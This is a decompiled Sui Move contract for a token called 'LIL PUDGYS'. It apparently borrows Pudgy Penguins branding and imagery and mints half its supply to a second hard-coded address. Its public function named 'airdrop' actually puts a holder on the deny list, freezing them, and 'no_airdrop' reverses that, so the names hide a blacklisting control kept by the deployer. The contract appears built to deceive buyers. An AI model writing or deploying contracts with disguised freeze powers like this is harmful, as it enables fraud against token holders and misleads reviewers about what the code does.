module 0x979861f60a190fc0ecd4698efec772222f6f6056497f0a78234e21445ddb81ff::pudgys {
    struct PUDGYS has drop {
        dummy_field: bool,
    }

    public fun airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PUDGYS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<PUDGYS>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: PUDGYS, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<PUDGYS>(arg0, 9, b"LIL PUDGYS", b"Sui Lil Pudgys", b"Lil Pudgys are an integral piece of the Pudgy Penguins history. Their story began during the most frigid of winters. In the midst of adversity, the birth of the Lil Pudgys helped spark new-life into the Pudgy Penguins community.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://i.seadn.io/gae/s4Td3KYsUlCblO6lQKAGAWdKwsCuumcxYpebM_YL-Pex-BP886JYAWjKBLeB5StNopAAD6kVx3QHqWm9AmudXyCaCZszHbt8SdteEQ?auto=format&dpr=1&w=256")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PUDGYS>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PUDGYS>>(v1, 0x2::tx_context::sender(arg1));
        0x2::coin::mint_and_transfer<PUDGYS>(&mut v3, 500000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::coin::mint_and_transfer<PUDGYS>(&mut v3, 500000000000000000, @0xbb2a8bd8cbe3ef5e9e89ff6369d7d57afba32032ab99f9071d81984201b37b94, arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<PUDGYS>>(v3, 0x2::tx_context::sender(arg1));
    }

    public fun no_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PUDGYS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<PUDGYS>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

